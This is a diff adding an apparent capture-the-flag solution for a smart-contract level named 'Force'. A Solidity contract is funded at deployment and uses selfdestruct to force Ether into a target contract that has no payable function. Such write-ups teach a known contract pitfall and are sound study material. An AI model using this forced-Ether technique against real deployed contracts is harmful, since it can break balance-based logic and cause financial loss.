@@ -1,0 +1,17 @@
+The "Force" contract does not have a "payable" function so we cannot transfer any Ether through usual means. We can however create another contract and call the selfdestruct() function that can send Ether to any address regardless of the payable status.
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.10;
+
+// Send this contract some Ether while deploying
+contract Solution
+{
+    // Make payable to send ether during deployment
+    constructor() payable {}
+    
+    function SendEtherForcefully(address target) external
+    {
+        // make sender address payable to surrender all Ether after selfdestruct
+        selfdestruct(payable(target));
+    }
+}
